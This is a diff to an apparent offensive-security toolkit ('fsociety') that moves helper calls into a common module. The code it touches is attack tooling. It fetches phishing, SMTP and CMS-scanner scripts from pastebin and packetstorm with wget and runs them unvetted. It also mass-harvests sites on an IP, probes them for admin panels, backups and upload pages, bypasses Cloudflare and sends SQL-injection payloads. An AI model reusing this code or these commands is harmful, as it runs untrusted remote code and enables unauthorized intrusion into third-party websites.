-    salt = secure_input("Enter the android salt: ")
+    key = common.secure_input("Enter the android hash: ")
+    salt = common.secure_input("Enter the android salt: ")
     os.system(
         "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
     os.system(
@@ -1363,7 +807,7 @@ def androidhash():
 
 def cmsfew():
     print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
-    target = secure_input("Select a target: ")
+    target = common.secure_input("Select a target: ")
     os.system(
         "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
     os.system("python cms.py %s" % target)
@@ -1371,17 +815,17 @@ def cmsfew():
 
 def smtpsend():
     os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
-    clear_scr()
+    common.clear_scr()
     os.system("python smtp.py")
 
 
 def pisher():
     os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
-    clear_scr()
+    common.clear_scr()
     os.system("python pisher.py")
 
 
-menuu = fsocietylogo + '''
+menuu = common.fsocietylogo + '''
 
    {1}--Get all websites
    {2}--Get joomla websites
@@ -1414,7 +858,7 @@ class Fscan:
         self.get_sites(False)
         print(menuu)
         while True:
-            choice = secure_input(fsociety_prompt)
+            choice = common.secure_input (common.fsociety_prompt)
             if choice == '1':
                 self.get_sites(True)
             elif choice == '2':
@@ -1432,7 +876,7 @@ class Fscan:
             elif choice == '8':
                 self.grab_sqli()
             elif choice == '9':
-                ran = secure_input(' Enter range of ports, (ex: 1-1000) -> ')
+                ran = common.secure_input(' Enter range of ports, (ex: 1-1000) -> ')
                 self.port_scanner(1, ran)
             elif choice == '10':
                 self.port_scanner(2, None)
@@ -1442,11 +886,11 @@ class Fscan:
                 self.cloudflare_bypasser()
             elif choice == '99':
                 Fsociety()
-            con = secure_input(' Continue [Y/n] -> ')
+            con = common.secure_input(' Continue [Y/n] -> ')
             if con[0].upper() == 'N':
                 exit()
             else:
-                clear_scr()
+                common.clear_scr()
                 print(menuu)
 
     def get_sites(self, a):
@@ -1478,7 +922,7 @@ class Fscan:
                 pass
         self.sites = unique(lista)
         if a:
-            clear_scr()
+            common.clear_scr()
             print('[*] Found ', len(lista), ' Website\n')
             for site in self.sites:
                 print(site)
@@ -1507,7 +951,7 @@ class Fscan:
             except:
                 pass
         lista = unique(lista)
-        clear_scr()
+        common.clear_scr()
         print('[*] Found ', len(lista), ' Wordpress Website\n')
         for site in lista:
             print(site)
@@ -1532,7 +976,7 @@ class Fscan:
                 lista.extend(findjm)
             page += 50
         lista = unique(lista)
-        clear_scr()
+        common.clear_scr()
         print('[*] Found ' + str(len(lista)) + ' Joomla Website\n')
         for site in lista:
             print(site)
@@ -1555,7 +999,7 @@ class Fscan:
                      'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login',
                      'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member',
                      'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
-        clear_scr()
+        common.clear_scr()
         for site in self.sites:
             for admin in adminList:
                 try:
@@ -1577,7 +1021,7 @@ class Fscan:
                    'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip',
                    'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip',
                    'wordpress.rar']
-        clear_scr()
+        common.clear_scr()
         print("[~] Finding zip file")
         for site in self.sites:
             for zip1 in zipList:
@@ -1597,7 +1041,7 @@ class Fscan:
                   'upload.php',
                   'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php',
                   'site/upload.php', 'download.php']
-        clear_scr()
+        common.clear_scr()
         print("[~] Finding Upload")
         for site in self.sites:
             for up in upList:
@@ -1618,7 +1062,7 @@ class Fscan:
         even mysql if it supports remote login
         (you can use medusa or hydra)
         """
-        clear_scr()
+        common.clear_scr()
         print("[~] Grabbing Users")
         userslist = []
         for site1 in self.sites:
@@ -1644,7 +1088,7 @@ class Fscan:
             except:
                 pass
 
-        clear_scr()
+        common.clear_scr()
         for user in userslist:
             print(user)
 
@@ -1654,7 +1098,7 @@ class Fscan:
         in my blog how it works, i learned this
         method from a guy in madleets
         """
-        clear_scr()
+        common.clear_scr()
         print("[~] Bypassing cloudflare")
         subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
         for site in self.sites:
@@ -1681,7 +1125,7 @@ class Fscan:
         the attacker may benefit from it
         like getting the server side software
         """
-        clear_scr()
+        common.clear_scr()
         try:
             s = 'http://' + self.serverip
             httpresponse = urllib.urlopen(s)
@@ -1721,7 +1165,7 @@ class Fscan:
         yahoo as i remember, you can find a separate
         tool in my blog
         """
-        clear_scr()
+        common.clear_scr()
         print("[~] Checking SQL injection")
         payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                     "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
@@ -1747,7 +1191,7 @@ class Fscan:
         Simple port scanner works with range of ports
         or with common ports (al-swisre idea)
         """
-        clear_scr()
+        common.clear_scr()
         print("[~] Scanning Ports")
 
         if mode == 1:
@@ -1780,7 +1224,7 @@ minu = '''
 
 def drupal():
     """Drupal Exploit Binger All Websites Of server"""
-    ip = secure_input('1- IP: ')
+    ip = common.secure_input('1- IP: ')
     page = 1
     while page <= 50:
 
@@ -1821,7 +1265,7 @@ def drupal():
 
 
 def getdrupal():
-    ip = secure_input('Enter The Ip:  ')
+    ip = common.secure_input('Enter The Ip:  ')
     page = 1
     sites = list()
     while page <= 50:
@@ -1845,7 +1289,7 @@ def getdrupal():
 
 
 def drupallist():
-    listop = secure_input("Enter The list Txt: ")
+    listop = common.secure_input("Enter The list Txt: ")
     fileopen = open(listop, 'r')
     content = fileopen.readlines()
     for i in content:
@@ -1869,7 +1313,7 @@ def drupallist():
 
 def maine():
     print(minu)
-    choose = secure_input("Choose a number: ")
+    choose = common.secure_input("Choose a number: ")
 
     while True:
         if choose == "1":
@@ -1911,7 +1355,7 @@ def check_joomla(sites):
 
 
 def wppjmla():
-    ipp = secure_input('Enter Target IP: ')
+    ipp = common.secure_input('Enter Target IP: ')
     sites = bing_all_grabber(str(ipp))
     wordpress = check_wordpress(sites)
     joomla = check_joomla(sites)
@@ -1963,48 +1407,8 @@ def checksqli(sqli):
 
 
 def sqlscan():
-    ip = secure_input('Enter IP -> ')
+    ip = common.secure_input('Enter IP -> ')
     grab_sqli(ip)
-
-
-def bing_all_grabber(s):
-    lista = []
-    page = 1
-    while page <= 101:
-        try:
-            bing = "http://www.bing.com/search?q=ip%3A" + \
-                   s + "+&count=50&first=" + str(page)
-            openbing = urllib2.urlopen(bing)
-            readbing = openbing.read()
-            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
-            for i in range(len(findwebs)):
-                allnoclean = findwebs[i]
-                findall1 = re.findall('http://(.*?)/', allnoclean)
-                for idx, item in enumerate(findall1):
-                    if 'www' not in item:
-                        findall1[idx] = 'http://www.' + item + '/'
-                    else:
-                        findall1[idx] = 'http://' + item + '/'
-                lista.extend(findall1)
-
-            page += 50
-        except urllib2.URLError:
-            pass
-
-    final = unique(lista)
-    return final
-
-
-def check_wordpress(sites):
-    wp = []
-    for site in sites:
-        try:
-            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
-                wp.append(site)
-        except:
-            pass
-
-    return wp
 
 
 def check_wpstorethemeremotefileupload(sites):
@@ -2069,7 +1473,7 @@ def check_wpsymposium(sites):
 
 
 def wpminiscanner():
-    ip = secure_input('Enter IP: ')
+    ip = common.secure_input('Enter IP: ')
     sites = bing_all_grabber(str(ip))
     wordpress = check_wordpress(sites)
     wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
@@ -2110,7 +1514,7 @@ def wpminiscanner():
 
 if __name__ == "__main__":
     try:
-        if agreement():
+        if common.agreement():
             Fsociety()
     except KeyboardInterrupt:
         print(" Finishing up...\n")
